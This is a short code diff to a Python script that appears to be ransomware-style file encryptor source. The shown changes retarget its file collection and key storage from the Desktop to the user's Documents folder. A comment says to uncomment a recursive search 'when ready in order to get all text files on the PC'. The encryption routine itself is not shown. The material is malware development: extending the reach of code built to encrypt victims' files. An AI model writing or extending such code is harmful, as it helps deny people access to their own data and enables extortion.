@@ -20,7 +20,7 @@ def generate_key(length=16):
 def find_all_files():
     # Uncomment when ready in order to get all text files on the PC
     # txt_files = glob.glob('**/*.txt', recursive=True)
-    desktop_path = os.path.expanduser("~/Desktop")
+    desktop_path = os.path.expanduser("~/Documents")
     file_pattern = os.path.join(desktop_path, "*.txt")
     txt_files = glob.glob(file_pattern)
     return txt_files
@@ -42,14 +42,14 @@ def find_all_encrypted_files():
     return txt_files
 
 def save_key(key, file_name='Key.key'):
-    desktop_path = os.path.expanduser("~/Desktop")
+    desktop_path = os.path.expanduser("~/Documents")
     file_path = os.path.join(desktop_path, file_name)
     with open(file_path, 'wb') as f:
         f.write(key)
 
 
 def read_key(file_name='Key.key'):
-    desktop_path = os.path.expanduser("~/Desktop")
+    desktop_path = os.path.expanduser("~/Documents")
     file_path = os.path.join(desktop_path, file_name)
     with open(file_path, 'rb') as f:
         key = f.read()
